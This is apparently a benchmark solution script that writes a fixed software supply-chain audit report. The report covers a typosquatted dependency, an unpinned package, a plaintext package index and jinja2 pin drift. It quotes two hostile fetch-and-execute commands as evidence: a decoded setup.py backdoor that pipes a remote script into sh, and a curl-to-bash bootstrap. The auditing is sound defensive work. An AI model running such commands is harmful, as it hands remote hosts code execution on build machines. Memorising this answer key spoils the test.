#!/usr/bin/env bash
set -euo pipefail
export APP_DIR="${APP_DIR:-/app}"
python3 - <<'PYEOF'
import json, os, pathlib

app = pathlib.Path(os.environ.get("APP_DIR", "/app"))
report = {
  "findings": [
    {
      "title": "Typosquatted dependency 'reqeusts' in deploy/requirements.txt",
      "severity": "critical",
      "category": "Software Supply Chain Failure / Typosquatting (CWE-1357)",
      "location": "app/deploy/requirements.txt: reqeusts==2.31.0",
      "evidence": "The pin 'reqeusts==2.31.0' transposes letters of the real 'requests' package (the security baseline in deploy/constraints.txt pins the correct name requests>=2.32.0, which makes the divergence greppable). A hostile registry or namespace squatter can publish 'reqeusts' and this build would install attacker-controlled code.",
      "impact": "Arbitrary code execution on every install/build host that resolves the typosquatted name.",
      "recommendation": "Correct the pin to requests>=2.32.0; enable dependency allowlists/hashes; monitor for lookalike package names."
    },
    {
      "title": "Install-time backdoor in vendored acme_jsonrpc setup.py",
      "severity": "critical",
      "category": "Software Supply Chain Failure / Backdoor (CWE-1357 / CWE-494)",
      "location": "app/vendor/acme_jsonrpc/setup.py",
      "evidence": "At import/exec time setup.py decodes a base64 blob (_b) and runs it via subprocess.getoutput: the decoded command is 'curl -s https://metrics.example-cdn.net/p.sh | sh'. This executes on any machine that builds or installs the vendored package.",
      "impact": "Remote code execution at install/build time on developer and CI machines (classic setup.py install-time backdoor).",
      "recommendation": "Remove the vendored package; never execute code at setup time; review third-party code and verify hashes/signatures before vendoring."
    },
    {
      "title": "Unpinned core dependency 'fastapi' (non-reproducible builds, dependency-confusion exposure)",
      "severity": "medium",
      "category": "Software Supply Chain Failure / Unpinned Dependency (CWE-1104)",
      "location": "app/deploy/requirements.txt: fastapi (no version pin)",
      "evidence": "'fastapi' has no version pin in deploy/requirements.txt ('unpinned by ops request'), so every build resolves whatever the index currently serves.",
      "impact": "Non-reproducible builds; a compromised or newly published fastapi release (or a lookalike in an extra index) is pulled automatically.",
      "recommendation": "Pin exact versions with hashes (pip-compile/lockfile); review upgrades before adoption."
    },
    {
      "title": "Plaintext HTTP extra package index (MITM-able, additive source)",
      "severity": "high",
      "category": "Software Supply Chain Failure / Insecure Index (CWE-494 / CWE-319)",
      "location": "app/deploy/requirements.txt: --extra-index-url http://pypi-mirror.internal.local/simple",
      "evidence": "--extra-index-url http://pypi-mirror.internal.local/simple uses plaintext HTTP (no TLS, trivially MITM-able) and extra-index semantics ADD a source rather than restrict to one index, so packages can silently resolve from the untrusted mirror.",
      "impact": "A network attacker can serve malicious packages/dependencies during install; dependency confusion between indexes.",
      "recommendation": "Use HTTPS with a trusted host, prefer --index-url over extra-index, pin hashes so foreign indexes cannot satisfy installs."
    },
    {
      "title": "Pin drift: jinja2==2.11.3 violates the security baseline in deploy/constraints.txt",
      "severity": "high",
      "category": "Software Supply Chain Failure / Constraint Drift (CWE-1104)",
      "location": "app/deploy/requirements.txt: jinja2==2.11.3 vs app/deploy/constraints.txt: jinja2>=3.1.4",
      "evidence": "deploy/requirements.txt pins jinja2==2.11.3 (EOL 2.x line with known CVEs) while the security team baseline in deploy/constraints.txt requires jinja2>=3.1.4 - a conflicting pin where requirements bypass the constraints drift.",
      "impact": "Known-vulnerable EOL Jinja2 ships to production despite the documented security baseline.",
      "recommendation": "Reconcile pins with constraints (jinja2>=3.1.4), enforce constraints in CI (-c constraints.txt), alert on drift."
    },
    {
      "title": "curl-pipe-shell bootstrap without verification in scripts/install.sh (CWE-494)",
      "severity": "high",
      "category": "Software Supply Chain Failure / Unverified Download",
      "location": "app/scripts/install.sh: curl -sSL https://get.example-tools.net/bootstrap.sh | bash",
      "evidence": "install.sh pipes a remote script straight into bash with no checksum, signature or version pinning; it also runs 'pip install -r deploy/requirements.txt --no-deps' which would install the typosquatted reqeusts pin.",
      "impact": "Whatever the remote host serves executes with user privileges; compromised bootstrap = compromised build environment.",
      "recommendation": "Download, verify a pinned checksum/signature, then execute; avoid curl|bash entirely."
    }
  ]
}

(app / "security_report.json").write_text(json.dumps(report, indent=2) + "\n")
print(f"wrote {app / 'security_report.json'}")
PYEOF
python3 -c "import json,os; json.load(open(os.path.join(os.environ.get('APP_DIR','/app'),'security_report.json'))); print('report OK')"
